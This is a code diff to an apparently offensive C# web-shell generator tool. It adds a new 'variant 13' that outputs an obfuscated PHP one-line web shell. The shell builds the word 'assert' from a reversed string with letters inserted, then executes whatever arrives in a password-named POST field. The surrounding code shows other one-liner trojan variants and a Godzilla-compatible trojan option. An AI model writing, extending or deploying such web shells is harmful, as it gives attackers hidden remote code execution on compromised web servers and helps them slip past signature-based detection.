@@ -94,6 +94,9 @@ namespace C2.Business.CastleBravo.WebShellTool
                 case "一句话Trojan_变种12":
                     ret = GenOneWord12(Password);
                     break;
+                case "变种13":
+                    ret = GenOneWord13(Password);
+                    break;
                 case "哥斯拉配套Trojan":
                     ret = GenGodzilla(Password, Key, EncryType);
                     break;
@@ -358,6 +361,20 @@ namespace C2.Business.CastleBravo.WebShellTool
               .AppendLine("$a='assert';")
               .AppendLine("array_map('$a',$_REQUEST);")
               .AppendLine("?>");
+            return sb.ToString();
+        }
+
+        private string GenOneWord13(string password)
+        {
+            StringBuilder sb = new StringBuilder();
+            sb.AppendLine(@"<?php ")
+              .AppendLine("error_reporting(0);")
+              .AppendLine("$b=\"zxczxczxczxczxcxzczx\";")
+              .AppendLine("function  yuag_array($b,$c){")
+              .AppendLine("$b=strrev($b);")
+              .AppendLine("array_map(substr_replace($b, 'ss', 1, 0),array($c));")
+              .AppendLine("}")
+              .AppendLine(string.Format("yuag_array(\"trea\",$_POST['{0}']);", password));
             return sb.ToString();
         }
 
